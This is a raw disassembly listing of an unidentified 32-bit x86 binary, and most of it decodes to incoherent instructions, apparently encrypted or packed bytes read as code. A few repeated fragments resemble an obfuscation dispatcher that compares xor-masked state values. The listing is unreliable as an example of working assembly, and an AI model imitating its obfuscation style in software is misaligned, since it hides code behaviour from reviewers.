  40b53c:	test   al,0xff
  40b53e:	cli    
  40b53f:	add    DWORD PTR [edx],0x33ccb3d
  40b545:	cdq    
  40b546:	pop    esp
  40b547:	and    eax,DWORD PTR [esi+0x56499eab]
  40b54d:	js     0x40b58a
  40b54f:	adc    al,BYTE PTR [edi-0x43]
  40b552:	mov    bl,0x55
  40b554:	xor    eax,0xd344dda9
  40b559:	cmp    BYTE PTR [ecx],0x20
  40b55c:	dec    esi
  40b55d:	mov    BYTE PTR [esi],dl
  40b55f:	cwde   
  40b560:	popf   
  40b561:	jae    0x40b54b
  40b563:	push   ds
  40b564:	je     0x40b51f
  40b566:	sub    DWORD PTR [ebx+0x79abd983],ebx
  40b56c:	inc    ecx
  40b56d:	out    0x4f,eax
  40b56f:	xchg   edi,eax
  40b570:	adc    DWORD PTR [edi-0x5030fb5f],esi
  40b576:	adc    al,0x90
  40b578:	sbb    bl,cl
  40b57a:	add    ecx,esi
  40b57c:	lahf   
  40b57d:	rol    BYTE PTR [edi],cl
  40b57f:	mov    ah,0x48
  40b581:	jg     0x40b50e
  40b583:	xchg   ecx,eax
  40b584:	shr    bl,cl
  40b586:	aaa    
  40b587:	mov    esi,0x36b2c0a5
  40b58c:	imul   DWORD PTR [edx]
  40b58e:	shr    DWORD PTR [ebx+0x60c802f1],cl
  40b594:	test   BYTE PTR [ecx-0x2cd21cd3],ch
  40b59a:	sti    
  40b59b:	adc    al,0x37
  40b59d:	fcomp  QWORD PTR [ebx-0x17aef976]
  40b5a3:	dec    esp
  40b5a4:	scas   al,BYTE PTR es:[edi]
  40b5a5:	mov    dh,0xc8
  40b5a7:	and    BYTE PTR [eax+edx*1],dh
  40b5aa:	push   0x593dd727
  40b5af:	call   0x89d8b739
  40b5b4:	arpl   WORD PTR [edi+eiz*8-0x1863c2d1],di
  40b5bb:	aas    
  40b5bc:	dec    ebp
  40b5bd:	hlt    
  40b5be:	out    0x41,al
  40b5c0:	or     BYTE PTR [edx],ch
  40b5c2:	dec    esi
  40b5c3:	push   ebp
  40b5c4:	arpl   WORD PTR [edi-0x65],cx
  40b5c7:	cmp    al,0x3c
  40b5c9:	data16 fst DWORD PTR [edx]
  40b5cc:	and    BYTE PTR [eax-0x3109b74c],0x1b
  40b5d3:	enter  0x5d0d,0x55
  40b5d7:	in     al,0x86
  40b5d9:	xor    DWORD PTR [edx-0x3cd6a721],edx
  40b5df:	add    DWORD PTR [ebp+0x3dc836a9],ecx
  40b5e5:	xor    al,0x25
  40b5e7:	mov    ebx,0xe0bd4195
  40b5ec:	dec    ebx
  40b5ed:	cli    
  40b5ee:	inc    ecx
  40b5ef:	xchg   esi,eax
  40b5f1:	pushf  
  40b5f2:	mov    ds:0x835ab595,eax
  40b5f7:	mov    ds:0x11875bab,eax
  40b5fc:	mov    bh,ah
  40b5fe:	push   ebp
  40b5ff:	xchg   DWORD PTR [esi+esi*2],ecx
  40b602:	in     eax,0xe9
  40b604:	or     esp,ecx
  40b606:	mov    ebx,DWORD PTR [eax-0x1c050baa]
  40b60c:	sub    bh,BYTE PTR [edx+edi*1]
  40b60f:	cli    
  40b610:	xlat   BYTE PTR ds:[ebx]
  40b611:	pop    ebp
  40b612:	pop    es
  40b613:	cmc    
  40b614:	or     eax,0x30d50af7
  40b619:	jp     0x40b63b
  40b61b:	jg     0x40b669
  40b61d:	ss mov ah,0x99
  40b620:	xor    cl,ch
  40b622:	dec    esp
  40b623:	dec    esi
  40b624:	sbb    eax,0x396d5fe5
  40b629:	icebp  
  40b62a:	mov    al,bh
  40b62c:	jge    0x40b69d
  40b62e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b62f:	aas    
  40b630:	cmp    eax,0xcf10997c
  40b635:	(bad)  
  40b636:	aaa    
  40b637:	jg     0x40b5fe
  40b639:	and    eax,0x368ba2d6
  40b63e:	cli    
  40b63f:	pop    esp
  40b640:	mov    cl,0x4e
  40b642:	pop    ebp
  40b643:	call   0x20fcebb8
  40b648:	je     0x40b643
  40b64a:	mov    bl,0xf1
  40b64c:	icebp  
  40b64d:	stos   BYTE PTR es:[edi],al
  40b64e:	adc    al,0x1a
  40b650:	jl     0x40b5ef
  40b652:	int    0xd9
  40b654:	pop    ds
  40b655:	mov    bl,0x63
  40b657:	jno    0x40b679
  40b659:	in     eax,dx
  40b65a:	es jg  0x40b6d1
  40b65d:	mov    eax,ds:0x875fd81f
  40b662:	add    eax,0xb07a49e2
  40b667:	nop    DWORD PTR [edx+eax*1+0x38784963]
  40b66f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b670:	daa    
  40b671:	idiv   DWORD PTR [esi-0x4d]
  40b674:	mov    esi,eax
  40b676:	icebp  
  40b677:	xchg   esp,eax
  40b678:	fistp  DWORD PTR [edi+0x70]
  40b67b:	scas   eax,DWORD PTR es:[edi]
  40b67c:	(bad)  
  40b67e:	les    ecx,FWORD PTR [esi-0x75]
  40b681:	or     DWORD PTR [edi+ebp*8+0x1c99c22d],0x1a
  40b689:	daa    
  40b68a:	cli    
  40b68b:	das    
  40b68c:	dec    ebp
  40b68d:	sub    DWORD PTR [ebp+0x3a52137f],edi
  40b693:	clc    
  40b694:	jne    0x40b6f5
  40b696:	int    0x77
  40b698:	cmp    eax,0xf2c7ca97
  40b69d:	cdq    
  40b69e:	add    edi,edx
  40b6a0:	lahf   
  40b6a1:	mov    WORD PTR [ecx+0x6fa64c9e],ss
  40b6a7:	test   BYTE PTR [edi-0x511a1938],0x9a
  40b6ae:	mov    ds:0x67b5cf2a,al
  40b6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6b4:	sahf   
  40b6b5:	aad    0x2e
  40b6b7:	push   DWORD PTR [ebp-0xe]
  40b6ba:	push   0xfffffff8
  40b6bc:	test   eax,0x3ab7eef7
  40b6c1:	sbb    al,0xf1
  40b6c3:	cmp    dh,dh
  40b6c5:	mov    al,0x78
  40b6c7:	mov    ah,0xc9
  40b6c9:	xor    eax,0x4dd8dbbf
  40b6ce:	mov    ds:0xc7a8f440,eax
  40b6d3:	xchg   DWORD PTR [ebp+0x15],eax
  40b6d6:	mov    ss,WORD PTR [edx+ebp*8]
  40b6d9:	arpl   dx,di
  40b6db:	pop    es
  40b6dc:	out    0x8e,al
  40b6de:	push   0xe89b9955
  40b6e3:	loopne 0x40b760
  40b6e5:	mov    bh,0xa8
  40b6e7:	fwait
  40b6e8:	xchg   ecx,eax
  40b6e9:	and    al,0xdd
  40b6eb:	sbb    al,0x1e
  40b6ed:	jmp    0xa14f3514
  40b6f2:	and    al,0xee
  40b6f4:	jb     0x40b688
  40b6f6:	aas    
  40b6f7:	pop    ecx
  40b6f8:	retf   
  40b6f9:	mov    ecx,0x4f6941d6
  40b6fe:	rcl    BYTE PTR [ecx],1
  40b700:	nop
  40b701:	sti    
  40b702:	or     DWORD PTR [ebx],0xb2bd4c72
  40b708:	rol    BYTE PTR [ebx+0x30],cl
  40b70b:	(bad)  
  40b70c:	pop    ss
  40b70d:	out    dx,al
  40b70e:	pop    ecx
  40b70f:	jo     0x40b712
  40b711:	adc    BYTE PTR [esi+0x1610c028],al
  40b717:	push   0xffffffdf
  40b719:	pusha  
  40b71a:	sbb    BYTE PTR [ecx-0x58],dh
  40b71d:	idiv   DWORD PTR [eax+0x4d]
  40b720:	into   
  40b721:	adc    ecx,DWORD PTR [ecx-0x48cb1395]
  40b727:	sbb    DWORD PTR [esi+ecx*8+0x383b167c],ebx
  40b72e:	dec    esp
  40b72f:	repz mov esp,0x36774220
  40b735:	repnz lock mov edx,0x59a7facc
  40b73c:	cs mov cl,0x36
  40b73f:	push   edi
  40b740:	cmp    eax,0x1be2c285
  40b745:	jl     0x40b74f
  40b747:	fs int 0x11
  40b74a:	push   es
  40b74b:	and    DWORD PTR [eax],0xffffffc4
  40b74e:	in     al,dx
  40b74f:	out    0x29,al
  40b751:	icebp  
  40b752:	cdq    
  40b753:	jns    0x40b72e
  40b755:	jle    0x40b799
  40b757:	jmp    0x75ff:0xd075ff80
  40b75e:	or     al,0xe8
  40b760:	scas   al,BYTE PTR es:[edi]
  40b761:	dec    edx
  40b762:	add    BYTE PTR [eax],al
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	cmp    al,0x5b
  40b78c:	pop    es
  40b78d:	push   ecx
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	push   ecx
  40b797:	push   edx
  40b798:	lods   al,BYTE PTR ds:[si]
  40b79a:	mov    al,BYTE PTR [eax]
  40b79c:	iret   
  40b79d:	je     0x40b791
  40b79f:	push   0xffffffdb
  40b7a1:	fisubr DWORD PTR [ebp+ebp*2-0x6da76821]
  40b7a8:	test   DWORD PTR [edi+0x31f96918],edi
  40b7ae:	aad    0x8a
  40b7b0:	cmp    ecx,DWORD PTR [eax]
  40b7b2:	and    DWORD PTR [edx],0x20
  40b7b5:	dec    edi
  40b7b6:	xor    eax,0x127c50d7
  40b7bb:	sahf   
  40b7bc:	or     BYTE PTR ds:0x645008b8,ah
  40b7c2:	(bad)
  40b7c5:	cmp    BYTE PTR [edi-0x41],dh
  40b7c8:	mov    esi,0xaf7bfb63
  40b7cd:	or     eax,0xa977a5fc
  40b7d2:	lahf   
  40b7d3:	lea    edx,[ebp+0x57]
  40b7d6:	push   0xffffff84
  40b7d8:	(bad)  
  40b7d9:	out    0x8a,al
  40b7db:	and    eax,0x80f5a41e
  40b7e0:	fldpi  
  40b7e2:	push   edx
  40b7e3:	es ret 
  40b7e5:	dec    esp
  40b7e6:	out    0xb4,al
  40b7e8:	popf   
  40b7e9:	inc    ebp
  40b7ea:	xchg   DWORD PTR [esi],edi
  40b7ec:	sub    DWORD PTR [eax+0x5302e0d1],0x5b
  40b7f3:	pop    ebx
  40b7f4:	sbb    BYTE PTR [edx],bl
  40b7f6:	add    al,0x78
  40b7f8:	sbb    DWORD PTR [edx+0x56],edx
  40b7fb:	shr    DWORD PTR [eax],0xaa
  40b7fe:	popf   
  40b7ff:	mov    al,0x6e
  40b801:	dec    eax
  40b802:	xlat   BYTE PTR ds:[ebx]
  40b803:	cmp    BYTE PTR [ebp-0x3f61e10b],al
  40b809:	xchg   ecx,eax
  40b80a:	dec    edx
  40b80b:	or     al,0xcf
  40b80d:	dec    BYTE PTR [eax-0x2db66026]
  40b813:	lds    ebx,FWORD PTR [ecx-0x4db954d7]
  40b819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b81a:	fs mov edx,0xde5cff51
  40b820:	test   eax,0x8925405d
  40b825:	dec    eax
  40b826:	call   0xaedd:0x7ed99487
  40b82d:	push   es
  40b82e:	inc    edx
  40b82f:	clc    
  40b830:	(bad)
  40b833:	imul   edx,DWORD PTR [edx+0x55],0x5c2403a1
  40b83a:	or     al,0x27
  40b83c:	ror    BYTE PTR [eax],0x91
  40b83f:	or     ecx,ecx
  40b841:	jmp    0x701345d0
  40b846:	scas   eax,DWORD PTR es:[edi]
  40b847:	adc    eax,0x3aacc22f
  40b84c:	sub    eax,0x161a40ab
  40b851:	inc    edx
  40b852:	in     al,0xc8
  40b854:	pop    es
  40b855:	dec    ebp
  40b856:	xchg   edx,eax
  40b857:	sub    dl,BYTE PTR [eax+0x76]
  40b85a:	retf   0x461a
  40b85d:	mov    ebx,ebx
  40b85f:	inc    eax
  40b860:	or     BYTE PTR [edi],cl
  40b862:	enter  0xde2c,0x98
  40b866:	mov    bh,BYTE PTR fs:[edi+0x54]
  40b86a:	call   0xc99fa91a
  40b86f:	call   0xfedc:0x52370c5d
  40b876:	or     eax,ecx
  40b878:	out    0x99,al
  40b87a:	push   edi
  40b87b:	or     al,0xa3
  40b87d:	and    al,0xf5
  40b87f:	jge    0x40b862
  40b881:	mov    esi,DWORD PTR [ebp+edi*4+0x4c623cda]
  40b888:	(bad)  
  40b889:	inc    ebp
  40b88a:	dec    esp
  40b88b:	fwait
  40b88c:	popf   
  40b88d:	push   cs
  40b88e:	cmp    BYTE PTR [ebp+0x22],ch
  40b891:	jp     0x40b8e0
  40b893:	add    BYTE PTR [edx],ah
  40b895:	mov    ebx,0x63c83c60
  40b89a:	retf   0xe7c1
  40b89d:	push   0xffffffbb
  40b89f:	sti    
  40b8a0:	scas   eax,DWORD PTR es:[edi]
  40b8a1:	mov    ah,0x76
  40b8a3:	in     eax,dx
  40b8a4:	push   ebx
  40b8a5:	xchg   esi,eax
  40b8a6:	jle    0x40b8da
  40b8a8:	cmp    BYTE PTR [ebx+ebp*4-0x51],0x54
  40b8ad:	xchg   ecx,eax
  40b8ae:	rol    BYTE PTR [esi+ecx*1-0x12936089],0xab
  40b8b6:	jne    0x40b84c
  40b8b8:	bound  esi,QWORD PTR [ebx-0x71]
  40b8bb:	or     BYTE PTR [ecx+0x4],bh
  40b8be:	cli    
  40b8bf:	je     0x40b93a
  40b8c1:	jo     0x40b85b
  40b8c3:	mov    ds:0x567b812d,al
  40b8c8:	rcl    BYTE PTR [edi-0xd0cee10],cl
  40b8ce:	xchg   esi,eax
  40b8cf:	out    dx,eax
  40b8d0:	push   0x1e2dd107
  40b8d5:	and    DWORD PTR [ebx+0x4b],edx
  40b8d8:	test   bl,ch
  40b8da:	les    eax,FWORD PTR [ebx+0x2ea39ce2]
  40b8e0:	inc    edi
  40b8e1:	sub    BYTE PTR [edi],ch
  40b8e3:	cmp    BYTE PTR [eax-0x2],dl
  40b8e6:	cli    
  40b8e7:	(bad)  
  40b8e8:	xor    al,0x46
  40b8ea:	loop   0x40b8df
  40b8ec:	and    bh,BYTE PTR [edi+eiz*4+0x15]
  40b8f0:	sub    edi,DWORD PTR [esp+ebx*8]
  40b8f3:	sub    al,0x15
  40b8f5:	enter  0xb0a6,0x95
  40b8f9:	nop
  40b8fa:	pop    es
  40b8fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8fc:	adc    eax,0x30ee9577
  40b901:	sbb    eax,0xd7e3470d
  40b906:	mov    al,0xec
  40b908:	call   0x752a:0xcec6df63
  40b90f:	not    BYTE PTR [edx-0x3]
  40b912:	enter  0x2679,0xd7
  40b916:	push   ds
  40b917:	dec    esp
  40b918:	in     al,dx
  40b919:	rol    DWORD PTR [ecx+ebp*2+0x553dbc26],1
  40b920:	aaa    
  40b921:	je     0x40b8fd
  40b923:	xchg   edx,eax
  40b924:	and    DWORD PTR ss:[edx-0x2c],edi
  40b928:	xchg   esp,eax
  40b929:	mov    esp,0x6707d66e
  40b92e:	loope  0x40b906
  40b930:	mov    eax,0xaffcc533
  40b935:	cmp    eax,DWORD PTR [ecx]
  40b937:	imul   esp,DWORD PTR [eax+0x46bd2967],0xd393d3be
  40b941:	dec    esi
  40b942:	loopne 0x40b927
  40b944:	push   ds
  40b945:	pusha  
  40b946:	cmp    eax,0x65b75e7f
  40b94b:	mov    ds:0xb9c489cd,eax
  40b950:	test   al,0x7a
  40b953:	fmul   QWORD PTR [ecx]
  40b955:	fstp   TBYTE PTR [edx]
  40b957:	mov    ds:0xbd86f23c,eax
  40b95c:	sbb    eax,0x31b35529
  40b961:	sub    DWORD PTR [ebp+0x1f72a52f],eax
  40b967:	mov    eax,ds:0xff02a1c0
  40b96c:	xor    edi,esi
  40b96e:	jg     0x40b9bb
  40b970:	inc    edi
  40b971:	cmp    bl,ah
  40b973:	push   cs
  40b974:	or     eax,0x825a69ff
  40b979:	pop    ebp
  40b97a:	push   edi
  40b97b:	add    BYTE PTR [edi+0x14b4b6f6],dl
  40b981:	jae    0x40b9e0
  40b983:	fwait
  40b984:	and    edx,DWORD PTR [esi+0x216e4030]
  40b98a:	adc    BYTE PTR [ebx+0x4f],dl
  40b98d:	mov    ch,BYTE PTR [ebx+0x76]
  40b990:	stos   BYTE PTR es:[edi],al
  40b991:	call   0x1bb42a3e
  40b996:	mov    ebp,0x27174bea
  40b99b:	xlat   BYTE PTR ds:[ebx]
  40b99c:	ret    
  40b99d:	out    0x10,eax
  40b99f:	std    
  40b9a0:	clc    
  40b9a1:	dec    ecx
  40b9a2:	aam    0x8c
  40b9a4:	mov    eax,ds:0x86a4be76
  40b9a9:	leave  
  40b9aa:	dec    esp
  40b9ab:	out    dx,eax
  40b9ac:	and    al,0xa9
  40b9ae:	mov    edi,0x3a15b3e2
  40b9b3:	cmp    eax,0x181b048d
  40b9b9:	inc    ebx
  40b9ba:	pushf  
  40b9bb:	pop    ebx
  40b9bc:	jns    0x40ba22
  40b9be:	mov    al,0xfa
  40b9c0:	sbb    BYTE PTR [ecx+eax*4],0x36
  40b9c4:	push   esi
  40b9c5:	rcr    DWORD PTR [edx-0x44],cl
  40b9c8:	pop    es
  40b9c9:	pushf  
  40b9ca:	iret   
  40b9cb:	pop    esp
  40b9cc:	out    0x7e,eax
  40b9ce:	pusha  
  40b9cf:	repz push edi
  40b9d1:	mov    bh,0x50
  40b9d3:	sbb    DWORD PTR [eax-0x2a],edx
  40b9d6:	call   0x8bd4:0x6c42a679
  40b9dd:	inc    ebp
  40b9de:	loopne 0x40ba27
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x233a808],eax
  40ba0f:	jnp    0x40ba67
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	jbe    0x40b9b6
  40ba1b:	pop    ebx
  40ba1c:	mov    esp,0x7a0c1cb
  40ba21:	jne    0x40b9d1
  40ba23:	inc    eax
  40ba24:	hlt    
  40ba25:	fwait
  40ba26:	pop    ds
  40ba27:	daa    
  40ba28:	add    al,BYTE PTR [ebx]
  40ba2a:	cli    
  40ba2b:	pop    ds
  40ba2c:	mov    ds:0x7c1dd05c,eax
  40ba31:	push   0x6
  40ba33:	jns    0x40ba82
  40ba35:	xchg   ecx,eax
  40ba36:	cwde   
  40ba37:	dec    ecx
  40ba38:	jmp    0x27f0:0xf2dd2018
  40ba3f:	jmp    0x9aada349
  40ba44:	inc    ebx
  40ba45:	in     eax,0xc
  40ba47:	xlat   BYTE PTR ds:[ebx]
  40ba48:	jnp    0x40baba
  40ba4a:	xchg   edx,eax
  40ba4b:	push   ds
  40ba4c:	push   0x2f
  40ba4e:	sbb    ebp,DWORD PTR [esi-0x5a]
  40ba51:	ins    DWORD PTR es:[edi],dx
  40ba52:	dec    ebp
  40ba53:	xchg   ecx,eax
  40ba54:	xor    eax,0xb7b5e5dd
  40ba59:	and    cl,dl
  40ba5b:	add    eax,0x2a9169af
  40ba61:	(bad)  
  40ba62:	adc    al,0xeb
  40ba64:	sti    
  40ba65:	jo     0x40b9f5
  40ba67:	(bad)  
  40ba68:	and    eax,0x6990a196
  40ba6d:	test   al,0x59
  40ba6f:	mov    BYTE PTR [ebx+0x13],ah
  40ba72:	add    edx,esp
  40ba74:	popa   
  40ba75:	mov    al,0x30
  40ba77:	sbb    DWORD PTR [esi],edi
  40ba79:	fidivr DWORD PTR [eax+0x3a1fd49e]
  40ba7f:	sti    
  40ba80:	jae    0x40baba
  40ba82:	cmp    eax,DWORD PTR [edx+0x24785231]
  40ba88:	sbb    al,0xea
  40ba8a:	push   es
  40ba8b:	jno    0x40baf8
  40ba8d:	fldenv [ecx-0x5b16d8a4]
  40ba93:	lock push ebp
  40ba95:	xor    ebp,ebp
  40ba97:	jnp    0x40baa3
  40ba99:	test   DWORD PTR [edi],esp
  40ba9b:	call   0xc130:0x2a0128cd
  40baa2:	ja     0x40ba40
  40baa4:	ret    
  40baa5:	in     eax,0xbf
  40baa7:	retf   
  40baa8:	inc    ebx
  40baa9:	enter  0xdc6d,0x1c
  40baad:	jp     0x40baf8
  40baaf:	stos   BYTE PTR es:[edi],al
  40bab0:	imul   edi,DWORD PTR [esi+0x5e3c1323],0x7cec3507
  40baba:	and    esi,edx
  40babc:	pop    edx
  40babd:	call   0xad409e47
  40bac2:	rol    DWORD PTR [ebx-0x59f0821],1
  40bac8:	xchg   ebp,eax
  40bac9:	fdiv   QWORD PTR [eax-0xbf1600e]
  40bacf:	(bad)  
  40bad0:	sub    edx,edx
  40bad2:	mov    ch,0xa5
  40bad4:	mov    bh,0x82
  40bad6:	and    BYTE PTR [ecx+0x789d3d8c],0xbc
  40badd:	in     al,0xf9
  40badf:	aam    0xef
  40bae1:	add    dh,BYTE PTR [ebp-0x2a]
  40bae4:	cmc    
  40bae5:	stos   BYTE PTR es:[edi],al
  40bae6:	cmp    esp,eax
  40bae8:	jmp    DWORD PTR [ecx+esi*2+0x24c2db41]
  40baef:	stc    
  40baf0:	clc    
  40baf1:	dec    eax
  40baf2:	jg     0x40bafc
  40baf4:	shl    BYTE PTR [esi],0x45
  40baf7:	mov    eax,ds:0xc16b9c86
  40bafc:	add    BYTE PTR [ecx+eiz*1+0x31e95c49],ch
  40bb03:	pushf  
  40bb04:	and    al,0x6
  40bb06:	xchg   edi,eax
  40bb07:	mov    cl,BYTE PTR [ebx]
  40bb09:	mov    ch,0xb5
  40bb0b:	fs ja  0x40badd
  40bb0e:	outs   dx,BYTE PTR ds:[esi]
  40bb0f:	and    BYTE PTR [edx+0x58297258],bl
  40bb15:	scas   al,BYTE PTR es:[edi]
  40bb16:	inc    ebx
  40bb17:	lock mov WORD PTR [ecx-0x7b0612ce],?
  40bb1e:	mov    esp,0xcf5c9386
  40bb23:	xor    al,al
  40bb25:	into   
  40bb26:	lds    ebx,FWORD PTR [eax+0x5e]
  40bb29:	cmp    eax,DWORD PTR [edx-0x7e]
  40bb2c:	mov    DWORD PTR ds:[ebp+0x32],ebp
  40bb30:	add    ecx,edi
  40bb32:	iret   
  40bb33:	aas    
  40bb34:	pushf  
  40bb35:	lods   al,BYTE PTR ds:[esi]
  40bb36:	cmc    
  40bb37:	shl    DWORD PTR [esi+0x4],cl
  40bb3a:	xlat   BYTE PTR ds:[ebx]
  40bb3b:	lahf   
  40bb3c:	cli    
  40bb3d:	ins    DWORD PTR es:[edi],dx
  40bb3e:	icebp  
  40bb3f:	add    dl,BYTE PTR [esi+0x4b]
  40bb42:	jbe    0x40bb07
  40bb44:	cmp    cl,ch
  40bb46:	mov    BYTE PTR [esi],cl
  40bb48:	inc    ebp
  40bb49:	cmp    BYTE PTR [eax],0x9a
  40bb4c:	out    dx,eax
  40bb4d:	in     al,0xfd
  40bb4f:	pop    esp
  40bb50:	add    eax,0xce5ed2a4
  40bb55:	scas   al,BYTE PTR es:[edi]
  40bb56:	add    eax,0xa76f70b3
  40bb5b:	mov    al,0xf0
  40bb5d:	fimul  DWORD PTR [edx+0x6d55de0b]
  40bb63:	test   al,0xd6
  40bb65:	inc    ebx
  40bb66:	ror    BYTE PTR [ebx-0x76],0x63
  40bb6a:	cmp    DWORD PTR [edi],edi
  40bb6c:	push   eax
  40bb6d:	cs dec ebp
  40bb6f:	xchg   ebx,eax
  40bb70:	lds    ebx,FWORD PTR [ecx-0x15cbe3ac]
  40bb76:	pop    ss
  40bb77:	les    edi,FWORD PTR [esi+eax*1]
  40bb7a:	mov    ch,0xab
  40bb7c:	mov    eax,0xfc99cb16
  40bb81:	fmul   QWORD PTR [ebp-0x55]
  40bb84:	fstp   QWORD PTR [edx+0x30]
  40bb87:	and    eax,0xdf1416
  40bb8c:	xor    ebp,DWORD PTR [ebx]
  40bb8e:	jno    0x40bb7f
  40bb90:	pushf  
  40bb91:	ins    BYTE PTR es:[edi],dx
  40bb92:	pop    edx
  40bb93:	aaa    
  40bb94:	lods   eax,DWORD PTR ds:[esi]
  40bb95:	gs adc eax,ebp
  40bb98:	lahf   
  40bb99:	mov    eax,ds:0xd9de69af
  40bb9e:	inc    eax
  40bb9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bba0:	jno    0x40bb2a
  40bba2:	fs cmp ch,0xd1
  40bba6:	jmp    0xe3bbba6b
  40bbab:	das    
  40bbac:	jno    0x40bbe7
  40bbae:	xchg   edx,eax
  40bbaf:	(bad)  
  40bbb0:	cmp    ch,BYTE PTR [edi]
  40bbb2:	mov    ebp,0xf4e61401
  40bbb7:	mov    ecx,0x55c6adca
  40bbbc:	fs mov dh,0xf3
  40bbbf:	retf   0xa81d
  40bbc2:	pop    edx
  40bbc3:	jmp    0xd1da:0xb56ad141
  40bbca:	das    
  40bbcb:	sbb    edi,edx
  40bbcd:	cmp    esp,0x2d8a4399
  40bbd3:	xchg   dl,dl
  40bbd5:	xchg   esi,eax
  40bbd6:	mov    ebp,0xfc9ed796
  40bbdb:	cli    
  40bbdc:	js     0x40bc14
  40bbde:	in     al,dx
  40bbdf:	xor    eax,0x5c149177
  40bbe4:	sub    ah,bh
  40bbe6:	outs   dx,BYTE PTR ds:[esi]
  40bbe7:	(bad)  
  40bbe8:	psubsw mm6,QWORD PTR [ecx+0x62]
  40bbec:	inc    eax
  40bbed:	xchg   ebp,eax
  40bbee:	sub    eax,DWORD PTR [ecx]
  40bbf0:	sbb    eax,0x5d8ebd8
  40bbf5:	sbb    BYTE PTR [ecx+0x2742f918],dl
  40bbfb:	mov    WORD PTR [ebx+0x4a],cs
  40bbfe:	push   cs
  40bbff:	add    BYTE PTR [ecx],0xdc
  40bc02:	fcmovnb st,st(7)
  40bc04:	and    eax,edi
  40bc06:	dec    edx
  40bc07:	sub    BYTE PTR [edx+0x42],0x7c
  40bc0b:	daa    
  40bc0c:	test   BYTE PTR [eax+esi*8+0x304eec16],bh
  40bc13:	stos   DWORD PTR es:[edi],eax
  40bc14:	push   es
  40bc15:	pop    ebp
  40bc16:	stos   DWORD PTR es:[edi],eax
  40bc17:	pop    ebx
  40bc18:	jg     0x40bc06
  40bc1a:	adc    edx,DWORD PTR [eax+0xc]
  40bc1d:	jmp    0xeca8:0x99d65f18
  40bc24:	xchg   ebx,eax
  40bc25:	into   
  40bc26:	push   es
  40bc27:	adc    al,0x77
  40bc29:	gs adc eax,0x5063bdaa
  40bc2f:	cmp    dh,cl
  40bc31:	scas   al,BYTE PTR es:[edi]
  40bc32:	addr16 pop ss
  40bc34:	dec    edx
  40bc35:	ret    0xad99
  40bc38:	xor    DWORD PTR [esp+eax*2+0x4d936e89],esi
  40bc3f:	loop   0x40bbc5
  40bc41:	inc    esi
  40bc42:	sbb    eax,0x1154dc33
  40bc47:	das    
  40bc48:	idiv   DWORD PTR [esi+0x5eedb507]
  40bc4e:	pop    eax
  40bc4f:	and    ebx,esi
  40bc51:	add    al,0x75
  40bc53:	xor    DWORD PTR [edx-0x7f1fca97],eax
  40bc59:	pop    es
  40bc5a:	fbld   TBYTE PTR [edi+0xf809b39]
  40bc60:	mov    bh,0x4
  40bc62:	js     0x40bbef
  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	icebp  
  40bc96:	nop
  40bc97:	xchg   edx,eax
  40bc98:	add    eax,esi
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	inc    edi
  40bca2:	mov    ?,WORD PTR [esi-0x57f4def7]
  40bca8:	push   0x5
  40bcaa:	scas   al,BYTE PTR es:[edi]
  40bcab:	enter  0x8655,0x10
  40bcaf:	cmp    BYTE PTR [ebp+eax*4-0x65],dl
  40bcb3:	jp     0x40bcc1
  40bcb5:	and    BYTE PTR [ebx+0x14958522],ch
  40bcbb:	popf   
  40bcbc:	pushf  
  40bcbd:	js     0x40bcf3
  40bcbf:	out    dx,al
  40bcc0:	jg     0x40bd17
  40bcc2:	or     eax,0x6ad505df
  40bcc7:	arpl   WORD PTR [ebx+ebp*8],ax
  40bcca:	mov    eax,ds:0x32b537e8
  40bccf:	popf   
  40bcd0:	retf   0xd0bb
  40bcd3:	popa   
  40bcd4:	retf   
  40bcd5:	mov    al,ds:0x363d81bd
  40bcda:	test   bl,al
  40bcdc:	adc    ebx,DWORD PTR [edi+eiz*1+0x73]
  40bce0:	sub    ebp,DWORD PTR [esp+ebx*1+0xc]
  40bce4:	push   ds
  40bce5:	fcomp  DWORD PTR [esi+edx*8+0x56]
  40bce9:	aad    0x66
  40bceb:	enter  0x9110,0x76
  40bcef:	xchg   esp,eax
